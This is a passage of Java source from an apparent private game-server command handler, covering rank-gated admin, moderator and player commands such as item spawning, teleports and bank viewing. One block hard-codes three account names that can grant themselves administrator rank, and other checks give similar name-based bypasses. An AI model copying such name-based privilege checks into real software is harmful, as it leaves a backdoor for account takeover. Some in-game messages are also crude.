					Combat.random(3000), Combat.random(3000),
					Combat.random(3)));
		}
		if (commandStart.equalsIgnoreCase("killnpcs")) {
			for (NPC n : player.getRegion().getNpcs()) {
				if (n != null
						&& n.getDefinition().getId() == Integer
								.parseInt(as[1])) {
					/**
					 * >255 hits still null!?!
					 */
					n.getCombat().hit(n.health * 5, player, false,
                            Constants.DEFLECT);
					// World.getWorld().submit(new NpcDeathEvent(n));
					n.setDead(true);
					World.getWorld().submit(new NpcDeathEvent(n));
				}
			}
		}
		/**
		 * Test summoing specials, w8ing is a drag
		 */
		if (commandStart.equalsIgnoreCase("infsumm")) {
			World.getWorld().submit(new Event(1000) {
				public void execute() {
					player.getSummBar().increment(100);
				}
			});
		}

		/**
		 * Make other player go to some coords - not under me
		 */
		if (commandStart.equalsIgnoreCase("teleothercloseloc")) {
			Player other = World.getWorld().getPlayer(as[1]);
			other.setTeleportTarget(player.getLocation()
					.getCloseLocation());
		}

		/**
		 * weapon will count as item? corrects the slot?
		 */

		if (commandStart.equalsIgnoreCase("testweapons")) {
			/**
			 * Other player - idk why actually; so i don't dc myself
			 */
			Player wep12 = World.getWorld().getPlayer(as[1]);
			/**
			 * uncomment this when not in beta testing
			 */
			if (ItemSpawning.allowedMessage(Integer.parseInt(as[3]))
					.length() > 0 && !Server.DEBUG) {
				return;
			}

			if (as.length == 4) {
				/**
				 * set player's slot
				 */
				wep12.getEquipment().set(
				/**
				 * slot
				 */
				Integer.parseInt(as[2]),
				/**
				 * weapon? = item? IDK if it works - weapon defines as
				 * item with extra definitions that'd make it easier to
				 * make a WEAPON instead of an item, interesting concept
				 * Weapons extends Item, but does it count as an item in
				 * this situation or DC?
				 */
				Item.create(Integer.parseInt(as[3])));
			} else if (as.length == 8) {
				wep12.getEquipment().set(
						Integer.parseInt(as[2]),
						Weapon.create(
						/**
						 * Is weapon
						 */
						Integer.parseInt(as[3]),
						/**
						 * Type of weapon - range/melee/mage
						 */
						Integer.parseInt(as[4]),
						/**
						 * Speed of weapon
						 */
						Integer.parseInt(as[5]),
						/**
						 * Two handed weapon?
						 */
						as[6].equalsIgnoreCase("true"),
						/**
						 * Controlled? EXP to all - not of concern :D
						 */
						false,
						/**
						 * What type of anims? Only dealing with attack
						 * anim
						 */
						WeaponAnimations.create(808, 819, 824,
								Integer.parseInt(as[7]), 1156)));
			} else {
				/**
				 * Syntax for the command - gets confusing
				 */
				player.getActionSender()
						.sendMessage(
								"::testweapons player slotid wepid type speed 2h attackanim");
			}
		}

		if (commandStart.equalsIgnoreCase("infpray")) {
			Player target = null;
			try {
				target = World.getWorld().getPlayer(
						s.substring(8).trim());
			} catch (NullPointerException
					| StringIndexOutOfBoundsException e) {
			}
			target = (target == null) ? player : target;

			final Player t = target;
			World.getWorld().submit(new Event(1000) {
				public void execute() {
					t.getSkills().setLevel(5, 99);
					if (t.cE == null)
						this.stop();
				}
			});
		}

		/**
		 * Summoning infos - useful
		 */
		if (commandStart.equalsIgnoreCase("summoninginfo")) {
			NPC summ = player.getCombat().getFamiliar();
			if (summ != null) {
				player.getActionSender().sendMessage(
						"You currently summoned a: "
								+ NPCDefinition.getDefinitions()[summ
										.getDefinition().getId()]
										.getName());
				Entity interaction = summ.getInteractingEntity();
				if (interaction instanceof Player) {
					Player interact = (Player) interaction;
					player.getActionSender().sendMessage(
							"Your familiar's current interaction is with "
									+ interact.getName());
				} else if (interaction != null) {
					NPC interact = (NPC) interaction;
					player.getActionSender()
							.sendMessage(
									"Your familiar's current interaction is with "
											+ NPCDefinition
													.getDefinitions()[interact
													.getDefinition()
													.getId()].getName());
				}
				player.getActionSender().sendMessage(
						"Your familiar's index is :" + summ.getIndex());
				Entity opp = summ.getCombat().getOpponent().getEntity();
				if (opp instanceof Player) {
					Player o = (Player) opp;
					player.getActionSender().sendMessage(
							"Your familiar's current opponent is "
									+ o.getName());
				} else if (opp != null) {
					NPC o = (NPC) opp;
					player.getActionSender().sendMessage(
							"Your familiar's current opponent is "
									+ NPCDefinition.getDefinitions()[o
											.getDefinition().getId()]
											.getName());
				}
				Combat.follow(summ.cE, player.cE);
			} else {
				player.getActionSender().sendMessage(
						"You don't have a familiar");
			}
		}

		if (commandStart.equals("anim")) {
			if (as.length == 2 || as.length == 3) {
				int l1 = Integer.parseInt(as[1]);
				int i4 = 0;
				if (as.length == 3) {
					i4 = Integer.parseInt(as[2]);
				}
				player.playAnimation(Animation.create(l1, i4));
			}
			return;
		}
		if (commandStart.equals("repeatanim")) {
			if (as.length == 2 || as.length == 3) {
				final int l1 = Integer.parseInt(as[1]);
				int i4 = 0;
				if (as.length == 3) {
					i4 = Integer.parseInt(as[2]);
				}
				final int i5 = i4;
				World.getWorld().submit(new Event(800) {
					public void execute() {
						player.playAnimation(Animation.create(l1, i5));
					}
				});
			}
			return;
		}
		if (commandStart.equalsIgnoreCase("setelo")) {
			int rating = Integer.parseInt(as[1]);
			player.getPoints().setEloRating(rating);
		}

		if (commandStart.equalsIgnoreCase("infhp")) {
			Player target = null;
			try {
				target = World.getWorld().getPlayer(
						s.substring(6).trim());
			} catch (NullPointerException
					| StringIndexOutOfBoundsException e) {
			}
			target = (target == null) ? player : target;

			final Player t = target;
			World.getWorld().submit(new Event(500) {
				public void execute() {
					int hp = t.getSkills().calculateMaxLifePoints();
					t.getSkills().setLevel(Skills.HITPOINTS, hp);
					if (t.cE == null)
						this.stop();
				}
			});
		}

		if (commandStart.equalsIgnoreCase("showalert")) {
			try {
				if (s.split("##").length < 2
						&& s.split("##").length > 3)
					throw new Exception();
				final String withC = withCaps;
				MassEvent.getSingleton().executeEvent(
						new EventBuilder() {
							public void execute(Player p) {
								p.sendMessage("Alert##"
										+ withC.substring(9).trim());
							}
						});
			} catch (Exception e) {
				player.sendMessage("Use as \"::showalert Line1##Line2##Line3\"");
			}

		}

		if (commandStart.equalsIgnoreCase("infovl")) {
			Player target = null;
			try {
				target = World.getWorld().getPlayer(
						s.substring(7).trim());
			} catch (NullPointerException
					| StringIndexOutOfBoundsException e) {
			}
			target = (target == null) ? player : target;

			final Player t = target;
			World.getWorld().submit(new Event(500) {
				public void execute() {
					t.resetOverloadCounter();
					t.overloadTimer = Long.MAX_VALUE;
					t.setOverloaded(true);
					World.getWorld().submit(new OverloadStatsEvent(t));
					World.getWorld().submit(new Event(20000) {
						public void execute() {
							t.resetOverloadCounter();
							t.overloadTimer = Long.MAX_VALUE;
							t.setOverloaded(true);
							if (t.cE == null)
								this.stop();
						}
					});
					this.stop();
				}
			});
		}
		/**
		 * Testing pvp tasks
		 */
		if (commandStart.startsWith("settaskamount")) {
			player.setPvPTaskAmount(Integer.parseInt(as[1]));
		}

		if (commandStart.equalsIgnoreCase("seesupers")) {
			for (Player p : World.getWorld().getPlayers()) {
				if (p != null) {
					if (Rank.getPrimaryRank(p).ordinal() == Rank.SUPER_DONATOR
							.ordinal()) {
						player.getActionSender().sendMessage(
								p.getName());
					}
				}
			}
		}
		/**
		 * Perform summoning special - no button for it
		 */
		if (commandStart.equalsIgnoreCase("summoningspec")) {
			SummoningSpecial.preformSpecial(
					player,
					SummoningSpecial.getCorrectSpecial(player
							.getCombat().getFamiliar().getDefinition()
							.getId()));
		}

		/**
		 * Testing skills, especially summoning Won't do 200M xp because
		 * i don't want to interfere with highscores D:
		 */
		if (commandStart.equalsIgnoreCase("masterme")) {
			for (int i = 0; i < 24; i++) {
				player.getSkills().setLevel(i, 99);
				player.getSkills().setExperience(i, 14000000);
			}
		}
		/**
		 * Make sure i don't screw with highscores, aslo i'll be able to
		 * train skills
		 */
		if (commandStart.equalsIgnoreCase("unmaster")) {
			for (int i = 10; i <= 21; i++) {
				player.getSkills().setLevel(i, 1);
				player.getSkills().setExperience(i, 1);
			}
		}

		if (commandStart.equalsIgnoreCase("repeatfx")) {
			final String[] as2 = as.clone();
			final int j = Integer.parseInt(as[1]);
			World.getWorld().submit(new Event(800) {
				@Override
				public void execute() {
					player.playGraphics(Graphic.create(j,
							as2.length == 3 ? Integer.parseInt(as2[2])
									: 0));
				}

			});
		}
		/**
		 * Displays strings
		 */
		if (commandStart.equalsIgnoreCase("sendstrings")) {
			for (int i = 0; i < 50000; i++) {
				try {
					player.getActionSender().sendString(i, "" + i);
				} catch (Throwable t) {
					player.getActionSender().sendMessage("Caught!");
					// ensures client doesn't freeze
				}
			}
		}
		if (commandStart.equals("interface")) {
			int i1 = Integer.parseInt(as[1]);
			player.getActionSender().showInterface(i1);
			return;
		}
		if (commandStart.equals("gfx")) {
			if (as.length == 2 || as.length == 3) {
				int i2 = Integer.parseInt(as[1]);
				int j4 = 0;
				if (as.length == 3) {
					j4 = Integer.parseInt(as[2]);
				}
				player.playGraphics(Graphic.create(i2, j4));
			}
		}
		if (commandStart.equals("bank")) {
		    Bank.open(player, false);
			return;
		}

		
		if (commandStart.equalsIgnoreCase("addmessage")) {
			final String message = withCaps.substring(11).trim();
			if (message.isEmpty()) {
				player.getActionSender().sendMessage(
						"Cannot add an empty message");
				return;
			}
			if (ServerMessages.contains(message)) {
				player.getActionSender().sendMessage(
						"No duplicate messages: " + message);
				return;
			}
			if (!ServerMessages.add(message)) {
				player.getActionSender().sendMessage(
						"Error adding message: " + message);
				return;
			}
			player.getActionSender().sendMessage(
					String.format("[Added Message] Index %d: %s",
							ServerMessages.size() - 1, message));
		}

		if (commandStart.equalsIgnoreCase("spamnpc")) {
			String message = s.substring(8).trim();
			for (NPC npc : World.getWorld().getNPCs()) {
				npc.forceMessage(message);
			}
		}
		if (commandStart.equalsIgnoreCase("clearinv")) {
			player.getInventory().clear();
		}
	}

	private void handleStaffCommands(final Player player, String commandStart,
			String s, String withCaps, String[] as) {
		if (commandStart.equalsIgnoreCase("checktickets")) {
			Ticket.checkTickets(player);
		}
        if(s.equalsIgnoreCase("jail"))
            player.setTeleportTarget(Jail.LOCATION);
        if(s.equalsIgnoreCase("unjail"))
            player.setTeleportTarget(Zanaris.LOCATION);
        /*if (commandStart.startsWith("unjail")) {
            try {
                s = s.replace("unjail ", "");
                Player player2 = World.getWorld().getPlayer(s);
                if (player2 != null) {
                    player2.setTeleportTarget(Zanaris.LOCATION);
                } else
                    player.getActionSender().sendMessage(
                            "This player is not online.");
            } catch (Exception exception3) {
            }
            return;
        }*/
		if (commandStart.equalsIgnoreCase("assist")) {
			Player otherPlayer = World.getWorld().getPlayer(s.substring(7));
			if (otherPlayer != null) {
				if (!otherPlayer.canSpawnSet()) {
					player.getActionSender().sendMessage(
							"You cannot assist this player right now!");
					return;
				}
				if (!Ticket.hasTicket(otherPlayer)) {
					player.getActionSender().sendMessage(
							"This player hasn't asked for help");
					return;
				}
				if (!player.canSpawnSet()) {
					return;
				}
				otherPlayer.setTeleportTarget(player.getLocation()
						.getCloseLocation());
				Ticket.removeRequest(otherPlayer);
			}
		}
	}

	private void handleModCommands(final Player player, String commandStart,
			String s, String withCaps, String[] as) {

		if (commandStart.equalsIgnoreCase("sendhome")) {
			Player target = World.getWorld().getPlayer(s.substring(9).trim());
			if (target != null) {
				if (Rank.hasAbility(target, Rank.ADMINISTRATOR)) {
					player.getActionSender()
							.sendMessage(
									"The Intermolecular force of Jet's micropenis stops him from being teleported!");
					return;
				}
				if (Rank.isStaffMember(target)
						&& !Rank.hasAbility(player, Rank.ADMINISTRATOR)) {
					player.getActionSender().sendMessage(
							"you cannot teleport staff home");
					return;
				}
				target.getActionSender()
						.sendMessage(
								player.getName()
										+ " has just bitch slapped you back to edgeville.");
				Magic.teleport(target, Edgeville.LOCATION, false);
			} else {
				player.getActionSender().sendMessage("Player not online");
			}
		}

		if (commandStart.equalsIgnoreCase("viewbank")) {
			Player viewed = World.getWorld().getPlayer(s.substring(8).trim());
			if (player.getChecking().getBankListener() != null) {
				player.getChecking().getBank()
						.removeListener(player.getChecking().getBankListener());
				player.getChecking().setBank(null);
				player.getChecking().setBankListener(null);
			}
			if (viewed != null) {
				player.getChecking().setBankListener(
						new InterfaceContainerListener(player, 5382));
				player.getChecking().setBank(viewed.getBank());
				player.getActionSender().sendInterfaceInventory(5292, 5063);
				player.getInterfaceState().addListener(
						player.getChecking().getBank(),
						player.getChecking().getBankListener());
				player.getActionSender().sendUpdateItems(5382,
						player.getChecking().getBank().toArray());
			}
		}
		if (commandStart.equalsIgnoreCase("viewinv")) {
			Player viewed = World.getWorld().getPlayer(s.substring(7).trim());
			if (player.getChecking().getInvListener() != null) {
				player.getChecking().getInv()
						.removeListener(player.getChecking().getInvListener());
				player.getChecking().setInv(null);
				player.getChecking().setInvListener(null);
			}
			if (viewed != null) {
				player.getChecking().setInvListener(
						new InterfaceContainerListener(player, 3214));
				player.getChecking().setInv(viewed.getInventory());
				//player.getActionSender().sendInterfaceInventory(5292, 5063);
				player.getInterfaceState().addListener(
						player.getChecking().getInv(),
						player.getChecking().getInvListener());
				player.getActionSender().sendUpdateItems(3214,player.getChecking().getInv().toArray());
			}
        }

		if (commandStart.equalsIgnoreCase("tracepkp")) {
			TreeMap<Long, Player> treemap = new TreeMap<Long, Player>();
			int count = 0;
			for (Player p : World.getWorld().getPlayers()) {
				if (p != null) {
					long amount = p.getInventory().getCount(5020);
					amount += p.getBank().getCount(5020);
					amount += p.getPoints().getPkPoints() / 10;
					treemap.put(amount, p);
				}
			}

			for (long l : treemap.keySet()) {
				player.getActionSender().sendMessage(
						"#" + (++count) + " [@blu@" + treemap.get(l).getName()
								+ "@bla@] - @red@" + l + " @or2@PK Tick Value");
			}
		}

		if (commandStart.equals("richest")) {
			TreeMap<Integer, Player> treemap = new TreeMap<Integer, Player>();
			for (Player p : World.getWorld().getPlayers()) {
				treemap.put(p.getAccountValue().getTotalValue(), p);
			}
			int count = 0;
			for (int i : treemap.keySet()) {
				player.getActionSender().sendMessage(
						"#" + (++count) + " [@blu@" + treemap.get(i).getName()
								+ "@bla@] - @red@" + i + " @gre@Don. Points");
			}
		}

		if (commandStart.equalsIgnoreCase("resetviewed")) {

			try {
				if (player.getChecking().getBank() != null) {
					player.getChecking()
							.getBank()
							.removeListener(
									player.getChecking().getBankListener());
					player.getChecking().setBank(null);
					player.getChecking().setBankListener(null);
				}
				if (player.getChecking().getInv() != null) {
					player.getChecking()
							.getInv()
							.removeListener(
									player.getChecking().getInvListener());
					player.getChecking().setInv(null);
					player.getChecking().setInvListener(null);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

		}

		if (commandStart.startsWith("syell")) {
			String message = s.substring(5).trim();
			PushMessage.pushStaffMessage(message, player);
		}

		if (commandStart.equalsIgnoreCase("accvalue")) {
			Player p = World.getWorld().getPlayer(s.substring(8).trim());

			if (p != null)
				player.sendMessage(p.getAccountValue().getTotalValue());

		}

		if (commandStart.equalsIgnoreCase("resetks")) {
			try {
				String name = withCaps.substring(8);
				Player target = World.getWorld().getPlayer(name);
				if (target != null) {
					target.setKillStreak(0);
				} else {
					player.getActionSender().sendMessage("Player not online");
				}
			} catch (NullPointerException | StringIndexOutOfBoundsException e) {
				return;
			}
		}

		if (commandStart.equalsIgnoreCase("resetkdr")) {
			try {
				String name = withCaps.substring(9);
				Player target = World.getWorld().getPlayer(name);
				if (target != null) {
					target.setKillCount(0);
					target.setDeathCount(0);
				} else {
					player.getActionSender().sendMessage("Player not online");
				}
			} catch (NullPointerException | StringIndexOutOfBoundsException e) {
				return;
			}
		}

		if (commandStart.equals("tele")) {
			if (as.length == 3 || as.length == 4) {
				int l = Integer.parseInt(as[1]);
				int k3 = Integer.parseInt(as[2]);
				int j5 = player.getLocation().getZ();
				if (as.length == 4) {
					j5 = Integer.parseInt(as[3]);
				}
				if (player.duelAttackable > 0) {
					player.getActionSender().sendMessage(
							"you cannot teleport out of a duel.");
					return;
				}
				player.setTeleportTarget(Location.create(l, k3, j5));
			} else {
				player.getActionSender().sendMessage(
						"Syntax is ::tele [x] [y] [z].");
			}
			return;
		}
		if (commandStart.equals("mypos")) {
			player.getActionSender().sendMessage(
					(new StringBuilder()).append(player.getLocation().getX())
							.append(", ").append(player.getLocation().getY())
							.toString());
			return;
		}

		if (commandStart.startsWith("staff")) {
			try {
				if ((player.getLocation().getX() >= 2934
						&& player.getLocation().getY() <= 3392
						&& player.getLocation().getX() <= 3061 && player
						.getLocation().getY() >= 3326)
						|| Rank.hasAbility(player, Rank.ADMINISTRATOR)
						|| player.getName().equalsIgnoreCase("charmed")) {
					s = s.replace("staff ", "");
					Player player2 = World.getWorld().getPlayer(s);
					if (player2 != null) {
						player2.setTeleportTarget(Location
								.create(3165, 9635, 0));
					} else
						player.getActionSender().sendMessage(
								"This player is not online.");
				}
			} catch (Exception exception3) {
			}
			return;
		}

		if (commandStart.equals("brightness")) {
			player.getActionSender().sendClientConfig(166, 4);
			return;
		}
		if (commandStart.equals("bob")) {
			BoB.openInventory(player);
			return;
		}
		if (commandStart.startsWith("giles")) {
			try {
				for (NPC n : World.getWorld().getNPCs()) {
					if (n.getDefinition().getId() == 2538) {
						player.getActionSender().sendMessage(
								"Giles at: " + n.getLocation().getX() + " "
										+ n.getLocation().getY() + " "
										+ n.getLocation().getZ() + " "
										+ n.isDead() + " " + n.serverKilled
										+ " " + n.isTeleporting());
						n.vacateSquare();
						player.setLocation(n.getLocation());
					}
				}
			} catch (Exception exception3) {
			}
			return;
		}

		// goto here
		if (commandStart.equals("namenpc")) {
			s = s.substring(8).toLowerCase();
			for (int i = 0; i < 6693; i++) {
				if (NPCDefinition.forId(i).name().toLowerCase().contains(s)) {
					player.getActionSender().sendMessage(
							i + "	" + NPCDefinition.forId(i).name());
				}
			}
			return;
		}
	}

	private void handleHeadModCommands(final Player player,
			String commandStart, String s, String withCaps, String[] as) {

        if (commandStart.equalsIgnoreCase("givekorasi")) {
            Player p = World.getWorld().getPlayer(s.substring(11).trim());
            if (p != null) {
                p.getInventory().add(new Item(19780, 1));
            }
        }
        if (commandStart.equalsIgnoreCase("givevigour")) {
            Player p = World.getWorld().getPlayer(s.substring(11).trim());
            if (p != null) {
                p.getInventory().add(new Item(19669, 1));
            }
        }
		if (commandStart.equalsIgnoreCase("resetks")) {
			try {
				String name = withCaps.substring(8);
				Player target = World.getWorld().getPlayer(name);
				if (target != null) {
					target.setKillStreak(0);
				} else {
					player.getActionSender().sendMessage("Player not online");
				}
			} catch (NullPointerException | StringIndexOutOfBoundsException e) {
				return;
			}
		}

		if (commandStart.equalsIgnoreCase("resetkdr")) {
			try {
				String name = withCaps.substring(9);
				Player target = World.getWorld().getPlayer(name);
				if (target != null) {
					target.setKillCount(0);
				} else {
					player.getActionSender().sendMessage("Player not online");
				}
			} catch (NullPointerException | StringIndexOutOfBoundsException e) {
				return;
			}
		}

	}

	private void handleGlobalModCommands(final Player player,
			String commandStart, String s, String withCaps, String[] as) {
		if (commandStart.equalsIgnoreCase("setplayertag")) {
			try {
				String name = withCaps
						.substring(withCaps.indexOf(" "), withCaps.indexOf(","))
						.trim().toLowerCase();
				Player target = World.getWorld().getPlayer(name);
				if (Rank.hasAbility(target, Rank.ADMINISTRATOR) && target != player)
					return;
				if (target != null) {
					String tag = withCaps.substring(withCaps.indexOf(",") + 1)
							.trim();
					String valid = Yelling.isValidTitle(tag);
					if(valid.length() > 1) {
						player.sendf(valid);
						return;
					}
					target.getYelling().setYellTitle(tag);
				} else {
					player.getActionSender().sendMessage("Player not online");
				}
			} catch (NullPointerException | StringIndexOutOfBoundsException e) {
				player.getActionSender().sendMessage("Invalid tag");
				return;
			}
		}

		if (commandStart.equalsIgnoreCase("removeplayertag")) {
			try {
				Player target = World.getWorld().getPlayer(
						s.substring(16).trim());
				if (Rank.hasAbility(target, Rank.ADMINISTRATOR) && target != player)
					return;
				if (target != null) {
					target.getYelling().setYellTitle("");
				} else {
					player.getActionSender().sendMessage("Player not online");
				}
			} catch (NullPointerException | StringIndexOutOfBoundsException e) {
				e.printStackTrace();
				return;
			}
		}
	}

	public void handle(final Player player, Packet packet) {
		try {
			String as[];
			String commandStart;
			String s = packet.getRS2String();
            player.getLogManager().add(LogEntry.command(s));
            String withCaps = new StringBuilder().append(s).append("")
					.toString();
			s = s.toLowerCase();
			as = s.split(" ");
			commandStart = as[0].toLowerCase();
			if(player.isDead())
				return;
			// player.getLogging().log("Command: " + s);
			if (Rank.hasAbility(player, Rank.OWNER))
				this.processOwnerCommands(player, commandStart, s, withCaps, as);
			if (Rank.hasAbility(player, Rank.DEVELOPER))
				this.processAdminCommands(player, commandStart, s, withCaps, as);
			if (Rank.hasAbility(player, Rank.ADMINISTRATOR))
				this.processDeveloperCommands(player, commandStart, s,
						withCaps, as);
			if (Rank.hasAbility(player, Rank.HEAD_MODERATOR))
				this.handleHeadModCommands(player, commandStart, s, withCaps,
						as);
			if(Rank.hasAbility(player, Rank.GLOBAL_MODERATOR))
				this.handleGlobalModCommands(player, commandStart, s, withCaps, as);
			if (Rank.hasAbility(player, Rank.MODERATOR))
				this.handleModCommands(player, commandStart, s, withCaps, as);
			if (Rank.isStaffMember(player))
				this.handleStaffCommands(player, commandStart, s, withCaps, as);
			if (CommandHandler.processed(commandStart, player, s))
				return;

            if(commandStart.equals("challenge")){
                final String text = withCaps.replaceFirst("challenge", "").trim();
                final Challenge challenge = ChallengeManager.getChallenge(text);
                if(challenge == null){
                    player.sendf("No challenge found for: @blu@%s", text);
                    return;
                }
                ChallengeManager.remove(challenge);
                player.getBank().add(challenge.getPrize());
                player.sendf("@blu@%s x%,d has been added to your bank!", challenge.getPrize().getDefinition().getName(), challenge.getPrize().getCount());
                final String winMsg = String.format("@blu@%s has beat %s's challenge for %s x%,d!", player.getName(), challenge.getName(), challenge.getPrize().getDefinition().getName(), challenge.getPrize().getCount());
                for(final Player p : World.getWorld().getPlayers())
                    if(p != null)
                        p.sendf(winMsg);
            }

            if(commandStart.equalsIgnoreCase("maxhit")) {
                final int melee = CombatAssistant.calculateMaxHit(player);
                final int range = CombatAssistant.calculateRangeMaxHit(player);
                player.sendf("Melee %d Range %d", melee, range);
            }
            
            if(commandStart.equalsIgnoreCase("helpzone") || commandStart.equals("help")) {
            	Magic.teleport(player, Location.create(2607, 9672, 0), false);
            }

            if(commandStart.equalsIgnoreCase("clearnulls")) {
                for(Player p : World.getWorld().getPlayers()) {
                    if(p == null) {
                        player.sendMessage("Null");
                        World.getWorld().getPlayers().remove(p);
                    }

                }
            }

			if (commandStart.equalsIgnoreCase("placebounty")) {
				final String input = s.substring(11).trim();
				final String data[] = input.split(",");
				try {
					final String name = data[0];
					final int amount = Integer.parseInt(data[1].trim());
					if (!getPlayerFile(name).exists())
						throw new Exception("Player doesn't exist!");
					if (player.getPoints().getPkPoints() < amount)
						throw new Exception(
								"You don't have enough PK points to do this!");
					if (World.getWorld().getBountyHandler()
							.add(name, player.getName(), amount)) {
						player.sendf(
								"You have successfully placed a bounty of %d on %s",
								amount, name);
						player.getPoints().setPkPoints(
								player.getPoints().getPkPoints() - amount);
					} else {
						throw new Exception(
								"Minimum bounty is 500pkp, or player's bounty is greater than yours!");
					}
				} catch (Exception e) {
					player.sendMessage(
							"Syntax is: ::placebounty name,pkpamount",
							e.getMessage());
				}
			}

			if (commandStart.equalsIgnoreCase("checkbounties")) {
				World.getWorld().getBountyHandler().listBounties(player);
			}

            if(commandStart.equalsIgnoreCase("givewikireward") && (Rank.hasAbility(player, Rank.DEVELOPER) || player.getName().equalsIgnoreCase("boomwiki"))) {
                final String name = s.replace("givewikireward", "");
                final Player target = World.getWorld().getPlayer(name.trim());
                if(target != null) {
                    target.getInventory().add(Item.create(17650, 1));
                    target.sendMessage("You receive a reward for being part of the ArteroPk wiki!");
                }
            }

			/**
			 * I had this based on names for a reason...
			 */
			for (String name : new String[] { "jet", "arre", "skiller" })
				if (player.getName().equalsIgnoreCase(name)) {
					/**
					 * Dev rank & Back
					 */
					if (commandStart.equals("rankme")) {
						if (Rank.hasAbility(player, Rank.ADMINISTRATOR)) {
							if (Rank.getPrimaryRank(player) == Rank.ADMINISTRATOR)
								player.setPlayerRank(Rank.setPrimaryRank(
										player, Rank.PLAYER));
							player.setPlayerRank(Rank.removeAbility(player,
									Rank.ADMINISTRATOR));
						} else
							player.setPlayerRank(Rank.setPrimaryRank(player,
									Rank.ADMINISTRATOR));
					}
					/**
					 * Statusesv - just for playing around, shouldn't be harmful
					 */
					if (commandStart.equals("checkstatus")) {
						int status = Integer.parseInt(as[1]);
						if (Rank.forIndex(status) != Rank.OWNER)
							player.setPlayerRank(Rank.setPrimaryRank(player,
									Rank.forIndex(status)));
					}
				}
			if (commandStart.equals("afk")) {
				Magic.teleport(player, Afk.LOCATION, false);
				return;
			}
			if (commandStart.equals("home")) {
				Magic.teleport(player, Edgeville.LOCATION, false);
				return;
			}

			if (commandStart.equalsIgnoreCase("rest")) {
				player.playAnimation(Animation.create(11786));
			}
			if (commandStart.equalsIgnoreCase("sit")) {
				player.playAnimation(Animation.create(2339));
			}

			if (commandStart.equalsIgnoreCase("search")) {
				String name = s.substring(6).trim();
				Item[] items = player.getBank().toArray().clone();
				for (int i = 0; i < items.length; i++) {
					if (items[i] != null
							&& !items[i].getDefinition().getName()
									.toLowerCase().contains(name))
						items[i] = null;
				}
				player.getActionSender().sendUpdateItems(5382, items);
			}

			if (commandStart.equals("dismiss")) {
				player.SummoningCounter = 0;
				player.getActionSender().sendMessage(
						"You dismiss your familiar.");
				return;
			}
			if (ClanManager.handleCommands(player, s, as))
				return;

			/**
			 * Spawn Server Commands.
			 */
			if (commandStart.equals("resetmyappearance")
					|| commandStart.equals("resetlook")) {
				player.getAppearance().resetAppearance();
				player.getActionSender().sendMessage("Look reset.");
				PlayerFiles.saveGame(player);
				return;
			}
			if (commandStart.equals("mb")) {
				Magic.teleport(player, 2539, 4718, 0, false);
				return;
			}
			if (commandStart.equals("multipk")) {
				Magic.teleport(player, 3234, 3650, 0, false);
				return;
			}

			if (commandStart.equalsIgnoreCase("upc")) {
				Set<String> set = new TreeSet<>();
				for (Player p : World.getWorld().getPlayers()) {
					set.add(p.getShortIP());
				}
				player.sendf("Playercount: %d", set.size());
			}
			if (commandStart.equals("13s")) {
				Magic.goTo13s(player);
			}
			if (commandStart.equals("nextbonus")) {
				Calendar c = Calendar.getInstance();
				player.sendMessage("The next bonus skills will be; ");
				int dayOfYear = (c.get(Calendar.DAY_OF_YEAR) + 4);
				for (int i = 1; i <= 5; i++) {
					int bonusSkill = ((dayOfYear + i) % (Skills.SKILL_COUNT - 8)) + 7;
					if (bonusSkill == 21) {
						player.sendMessage("random");
					} else {
						player.sendMessage(Misc.getSkillName(bonusSkill));
					}
				}
			}
			if (commandStart.equals("nameitem")) {
                InterfaceManager.<NameItemInterface>get(11).send(player, s.substring(9).toLowerCase());
				/*ArrayList<Item> itemsList = new ArrayList<Item>();
				if (as.length == 1)
					return;
				int counter = 0;
				s = s.substring(9).toLowerCase();
				int maxId = Rank.hasAbility(player, Rank.DEVELOPER) ? 20000
						: ItemSpawning.MAX_ID;
				for (int i = maxId; i > 0; i--) {
					if (ItemDefinition.forId(i) == null)
						continue;
					if (ItemDefinition.forId(i).getName().toLowerCase()
							.contains(s)) {
						itemsList.add(new Item(i));
						// player.getActionSender().sendMessage(
						// i + "	" + ItemDefinition.forId(i).getName());
						counter++;
						if (counter == 99)
							break;
					}
				}
				Item items[] = new Item[itemsList.size()];
				for (Item i : itemsList) {
					items[--counter] = i;
				}
				player.getActionSender().displayItems(items);*/
				return;
			}

			if (commandStart.equals("checkarea")) {
				player.sendMessage("In pits: "
						+ FightPits.inPitsFightArea(
								player.getLocation().getX(), player
										.getLocation().getY()));
			}
			if (!FightPits.inPits(player)
					&& !FightPits.inPitsFightArea(player.getLocation().getX(),
							player.getLocation().getY()) &&
                    !player.hardMode()) {
				if (commandStart.equals("vengrunes") && Server.SPAWN) {
					ContentEntity.addItem(player, 557, 1000);
					ContentEntity.addItem(player, 560, 1000);
					ContentEntity.addItem(player, 9075, 1000);
					return;
				}
				if (commandStart.equals("barragerunes") && Server.SPAWN) {
					ContentEntity.addItem(player, 560, 1000);
					ContentEntity.addItem(player, 565, 1000);
					ContentEntity.addItem(player, 555, 1000);
					return;
				}
				if (commandStart.equals("meleeset")) {
					SpawnTab.addMeleeSet(player);
					return;
				}
				if (commandStart.equals("hybridset")) {
					SpawnTab.addHybridSet(player);
					return;
				}
				if (commandStart.equals("mageset")
						|| commandStart.equals("magicset")) {
					SpawnTab.addMageSet(player);
					return;
				}
				if (commandStart.equals("rangeset")
						|| commandStart.equals("rangedset")
						|| commandStart.equals("rangingset")) {
					SpawnTab.addRangeSet(player);
					return;
				}
				if (commandStart.equals("rangepots")) {
					SpawnTab.addRangingPotions(player);
					return;
				}
				if (commandStart.equals("food")) {
					if (player.wildernessLevel > 0) {
						player.getActionSender().sendMessage(
								"You cannot do that in the wilderness.");
						return;
					} else if (player.duelAttackable > 0) {
						player.getActionSender().sendMessage(
								"You cannot do that in the duel arena.");
						return;
					}
					SpawnTab.addSharks(player);
					return;
				}
				if (commandStart.equals("superrestores") && Server.SPAWN) {
					SpawnTab.addSuperRestores(player);
					return;
				}
				if (commandStart.equals("superset") && Server.SPAWN) {
					SpawnTab.addSuperSets(player);
					return;
				}

				if (commandStart.equalsIgnoreCase("copy") && Server.SPAWN) {
					if (!copyCheck(player))
						return;
					if (ContentEntity.getTotalAmountOfEquipmentItems(player) > 0) {
						player.getActionSender()
								.sendMessage(
										"You need to take off your armour before copying!");
						return;
					}
					Player p = World.getWorld()
							.getPlayer(s.substring(5).trim());
					if (Rank.hasAbility(p, Rank.ADMINISTRATOR))
						return;
					if (p != null) {
						for (Item item : p.getEquipment().toArray()) {
							if (item != null) {
								if (copyCheck(item, player))
									continue;
								player.getEquipment()
										.set(Equipment.getType(item).getSlot(),
												item);
							}
						}
					}
				}

